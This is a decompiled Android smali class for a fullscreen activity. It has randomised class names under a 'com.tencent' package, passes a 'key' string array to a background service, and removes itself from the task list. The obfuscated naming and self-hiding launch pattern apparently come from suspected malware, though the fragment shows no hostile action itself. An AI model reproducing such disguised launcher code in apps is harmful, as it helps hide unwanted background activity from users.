.class public Lcom/tencent/endorsementkethicala24;
.super Landroid/app/Activity;
.source "endorsementkethicala24.java"


# instance fields
.field private final abcd:Landroid/content/BroadcastReceiver;


# direct methods
.method public constructor <init>()V
    .locals 1

    .line 14
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    .line 15
    new-instance v0, Lcom/tencent/endorsementkethicala24$1;

    invoke-direct {v0, p0}, Lcom/tencent/endorsementkethicala24$1;-><init>(Lcom/tencent/endorsementkethicala24;)V

    iput-object v0, p0, Lcom/tencent/endorsementkethicala24;->abcd:Landroid/content/BroadcastReceiver;

    return-void
.end method


# virtual methods
.method public finish()V
    .locals 0

    .line 26
    invoke-super {p0}, Landroid/app/Activity;->finishAndRemoveTask()V

    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 4

    .line 42
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    const/4 p1, 0x1

    .line 43
    invoke-virtual {p0, p1}, Lcom/tencent/endorsementkethicala24;->requestWindowFeature(I)Z

    .line 44
    invoke-virtual {p0}, Lcom/tencent/endorsementkethicala24;->getWindow()Landroid/view/Window;

    move-result-object p1

    const/16 v0, 0x400

    invoke-virtual {p1, v0, v0}, Landroid/view/Window;->setFlags(II)V

    .line 49
    :try_start_0
    invoke-virtual {p0}, Lcom/tencent/endorsementkethicala24;->getIntent()Landroid/content/Intent;

    move-result-object p1

    const-string v0, "key"

    .line 51
    invoke-virtual {p1, v0}, Landroid/content/Intent;->getStringArrayExtra(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object p1

    if-eqz p1, :cond_0

    .line 55
    invoke-virtual {p0}, Lcom/tencent/endorsementkethicala24;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    .line 56
    const-class v1, Lcom/tencent/tunesxconcerningn106;

    invoke-static {v1, v0}, Lcom/tencent/tunesxconcerningn1010;->removedqtractort40(Ljava/lang/Class;Landroid/content/Context;)Z

    move-result v1

    if-eqz v1, :cond_0

    .line 59
    iget-object v1, p0, Lcom/tencent/endorsementkethicala24;->abcd:Landroid/content/BroadcastReceiver;

    new-instance v2, Landroid/content/IntentFilter;

    const-string v3, "xyz"

    invoke-direct {v2, v3}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0, v1, v2}, Lcom/tencent/endorsementkethicala24;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    .line 62
    new-instance v1, Landroid/content/Intent;

    const-class v2, Lcom/tencent/tunesxconcerningn106;

    invoke-direct {v1, v0, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 63
    sget-object v2, Lcom/tencent/tunesxconcerningn108;->FTX1:Ljava/lang/String;

    invoke-virtual {v1, v2, p1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;[Ljava/lang/String;)Landroid/content/Intent;

    .line 64
    invoke-virtual {v0, v1}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 73
    :catch_0
    :cond_0
    invoke-virtual {p0}, Lcom/tencent/endorsementkethicala24;->finish()V

    return-void
.end method

.method protected onDestroy()V
    .locals 1

    .line 34
    invoke-super {p0}, Landroid/app/Activity;->onDestroy()V

    .line 36
    iget-object v0, p0, Lcom/tencent/endorsementkethicala24;->abcd:Landroid/content/BroadcastReceiver;

    invoke-virtual {p0, v0}, Lcom/tencent/endorsementkethicala24;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    return-void
.end method
